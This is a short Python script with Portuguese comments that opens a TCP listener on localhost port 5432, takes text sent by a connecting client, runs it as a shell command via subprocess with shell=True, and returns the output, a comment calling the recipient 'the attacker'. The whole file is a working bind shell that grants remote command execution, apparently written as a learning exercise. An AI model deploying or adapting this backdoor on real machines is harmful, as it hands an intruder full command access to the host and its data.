import subprocess
from socket import *

servidor = '127.0.0.1' #MESMA MAQUINA
porta = 5432 #MESMA PORTA SERV/CLIENT

conexao = socket(AF_INET, SOCK_STREAM) 
conexao.bind((servidor, porta)) #ABRE PORTA DO SERV PARA CONEXÃO
conexao.listen(2) #

print('Esperando conexão...')

resp = 'S'
while True:
    con, cliente = conexao.accept() #COM > DADOS \\ RECEBIDOS CLIENTE > ENDEREÇO DE MAQUINA
    print('Você está conectado com: ', cliente)

    while resp == 'S':
        msg_recebida = str(con.recv(1024))
        data_string = str(msg_recebida)[2:-1] #REMOVE 3 PRIMEIROS E ULTIMO PRO TEXTO VIR LIMPO
        print('Recebemos: ', data_string)

        proc = subprocess.Popen(data_string, shell=True, stdout=subprocess.PIPE) #ENVIA DADO RECEBIDO PARA O TERMINAL \\ POPPA TERMINAL > COMANDO | COMEXÃO VERDADEIRA SHELL | SAIDA PRA VARIAVEL |\\
        data = str(proc.stdout.read()) #LÊ O OUTPUT (BINARIO)
        msg_enviada = bytes(data, 'utf-8') #CONVERTE PARA BYTES
        con.send(msg_enviada) #DEVOLVE PRO ATACANTE

        resp = input('Digite S para continuar e N para terminar: ')

    con.close()